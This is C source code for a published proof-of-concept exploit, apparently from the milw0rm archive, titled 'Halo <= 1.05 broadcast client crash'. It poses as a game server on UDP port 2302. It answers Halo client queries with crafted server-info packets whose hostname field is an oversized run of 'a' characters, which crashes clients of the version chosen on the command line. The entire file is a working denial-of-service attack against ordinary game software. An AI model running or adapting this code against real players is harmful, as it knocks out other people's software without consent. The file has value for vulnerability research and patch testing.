/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef WIN32
    #include <winsock.h>
/*
   Header file used for manage errors in Windows
   It support socket and errno too
   (this header replace the previous sock_errX.h)
*/

#include <string.h>
#include <errno.h>



void std_err(void) {
    char    *error;

    switch(WSAGetLastError()) {
        case 10004: error = "Interrupted system call"; break;
        case 10009: error = "Bad file number"; break;
        case 10013: error = "Permission denied"; break;
        case 10014: error = "Bad address"; break;
        case 10022: error = "Invalid argument (not bind)"; break;
        case 10024: error = "Too many open files"; break;
        case 10035: error = "Operation would block"; break;
        case 10036: error = "Operation now in progress"; break;
        case 10037: error = "Operation already in progress"; break;
        case 10038: error = "Socket operation on non-socket"; break;
        case 10039: error = "Destination address required"; break;
        case 10040: error = "Message too long"; break;
        case 10041: error = "Protocol wrong type for socket"; break;
        case 10042: error = "Bad protocol option"; break;
        case 10043: error = "Protocol not supported"; break;
        case 10044: error = "Socket type not supported"; break;
        case 10045: error = "Operation not supported on socket"; break;
        case 10046: error = "Protocol family not supported"; break;
        case 10047: error = "Address family not supported by protocol family"; break;
        case 10048: error = "Address already in use"; break;
        case 10049: error = "Can't assign requested address"; break;
        case 10050: error = "Network is down"; break;
        case 10051: error = "Network is unreachable"; break;
        case 10052: error = "Net dropped connection or reset"; break;
        case 10053: error = "Software caused connection abort"; break;
        case 10054: error = "Connection reset by peer"; break;
        case 10055: error = "No buffer space available"; break;
        case 10056: error = "Socket is already connected"; break;
        case 10057: error = "Socket is not connected"; break;
        case 10058: error = "Can't send after socket shutdown"; break;
        case 10059: error = "Too many references, can't splice"; break;
        case 10060: error = "Connection timed out"; break;
        case 10061: error = "Connection refused"; break;
        case 10062: error = "Too many levels of symbolic links"; break;
        case 10063: error = "File name too long"; break;
        case 10064: error = "Host is down"; break;
        case 10065: error = "No Route to Host"; break;
        case 10066: error = "Directory not empty"; break;
        case 10067: error = "Too many processes"; break;
        case 10068: error = "Too many users"; break;
        case 10069: error = "Disc Quota Exceeded"; break;
        case 10070: error = "Stale NFS file handle"; break;
        case 10091: error = "Network SubSystem is unavailable"; break;
        case 10092: error = "WINSOCK DLL Version out of range"; break;
        case 10093: error = "Successful WSASTARTUP not yet performed"; break;
        case 10071: error = "Too many levels of remote in path"; break;
        case 11001: error = "Host not found"; break;
        case 11002: error = "Non-Authoritative Host not found"; break;
        case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;
        case 11004: error = "Valid name, no data record of requested type"; break;
        default: error = strerror(errno); break;
    }
    fprintf(stderr, "\nError: %s\n", error);
    exit(1);
}



    #define close   closesocket
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>
#endif



#define VER     "0.1"
#define BUFFSZ  2048
#define PING    "\x05\x00\x00\x00\x00\x00"
#define PORT    2302
#define GAMEVER "GAMEVER__HERE"
#define BOOM    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"



char *versions[][2] = {
    { "1.05",  "01.00.05.0610" },
    { "1.04",  "01.00.04.0607" },
    { "1.031", "01.00.03.0606" },
    { "1.03",  "01.00.03.0605" },
    { "1.02",  "01.00.02.0581" },
    { "1.01",  "01.00.01.0580" },
    { "1.00",  "01.00.00.0564" },
    { "ce",    "01.00.00.0609" },
    { NULL,    NULL }
};



void std_err(void);



int main(int argc, char *argv[]) {
    int     sd,
            len,
            on = 1,
            i,
            iver,
            psz;
    struct  sockaddr_in peer;
    u_char  buff[BUFFSZ + 1],
            *pck,
            pcklan[] =
                "\x00\x00\x00\x00\x00"
                "hostname\0"        BOOM "\0"   /* not only here */
                "gamever\0"         GAMEVER "\0"
                "hostport\0"        "\0"
                "maxplayers\0"      "16\0"
                "password\0"        "0\0"
                "mapname\0"         "longest\0"
                "dedicated\0"       "1\0"
                "gamemode\0"        "openplaying\0"
                "game_classic\0"    "0\0"
                "numplayers\0"      "0\0"
                "gametype\0"        "CTF\0"
                "teamplay\0"        "1\0"
                "gamevariant\0"     "\0"
                "fraglimit\0"       "3\0"
                "player_flags\0"    "1943015556,2\0"
                "game_flags\0"      "65\0"
                "\0"                "\0",
            pckinternet[] =
                "\x00\x00\x00\x00\x00"
                BOOM "\0"
                GAMEVER "\0"
                "0\0"
                "CTF\0"
                "openplaying\0"
                "0\0"
                "16\0";


    setbuf(stdout, NULL);

    fputs("\n"
        "Halo <= 1.05 broadcast client crash "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@altervista.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <version>\n"
            "\n"
            " You must decide what version of the clients you want to crash:\n"
            "\n", argv[0]);
        for(i = 0; *versions[i]; i++) {
            printf(" %s\t%s\n", versions[i][0], versions[i][1]);
        }
        fputc('\n', stdout);
        exit(1);
    }

    for(iver = 0; versions[iver][0]; iver++) {
        if(!strcmp(argv[1], versions[iver][0])) break;
    }
    if(!versions[iver][0]) {
        printf("\nError: you must choose between the versions listed at the beginning\n");
        exit(1);
    }
    printf("- version:   %s \t%s\n", versions[iver][0], versions[iver][1]);

    for(i = 0; i < (sizeof(pcklan) - 14); i++) {
        if(!memcmp(pcklan + i, GAMEVER, 13)) {
            memcpy(pcklan + i, versions[iver][1], 13);
            break;
        }
    }

    for(i = 0; i < (sizeof(pckinternet) - 14); i++) {
        if(!memcmp(pckinternet + i, GAMEVER, 13)) {
            memcpy(pckinternet + i, versions[iver][1], 13);
            break;
        }
    }

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    peer.sin_addr.s_addr = INADDR_ANY;
    peer.sin_port        = htons(PORT);
    peer.sin_family      = AF_INET;
    psz                  = sizeof(peer);

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    printf("- bind UDP port %d\n", PORT);
    if(setsockopt(sd, SOL_SOCKET, SO_REUSEADDR, (char *)&on, sizeof(on))
      < 0) std_err();
    if(bind(sd, (struct sockaddr *)&peer, sizeof(peer))
      < 0) std_err();

    fputs("\nClients:\n", stdout);
    while(1) {
        len = recvfrom(sd, buff, BUFFSZ, 0, (struct sockaddr *)&peer, &psz);
        if(len < 0) std_err();

        if(buff[2]) {
            printf("PING       %s:%hu\n",
                inet_ntoa(peer.sin_addr), htons(peer.sin_port));

            if(sendto(sd, PING, sizeof(PING) - 1, 0, (struct sockaddr *)&peer, sizeof(peer))
              < 0) std_err();
            continue;
        }

        if(len == 10) {
            fputs("LAN        ", stdout);
            pck = pcklan;
            len = sizeof(pcklan) - 1;
        } else {
            fputs("INTERNET   ", stdout);
            pck = pckinternet;
            len = sizeof(pckinternet) - 1;
        }

        printf("%s:%hu\n",
            inet_ntoa(peer.sin_addr), htons(peer.sin_port));

        memcpy(pck, buff + 2, 5);
        if(sendto(sd, pck, len, 0, (struct sockaddr *)&peer, sizeof(peer))
          < 0) std_err();
    }

    close(sd);
    return(0);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


// milw0rm.com [2004-11-22]
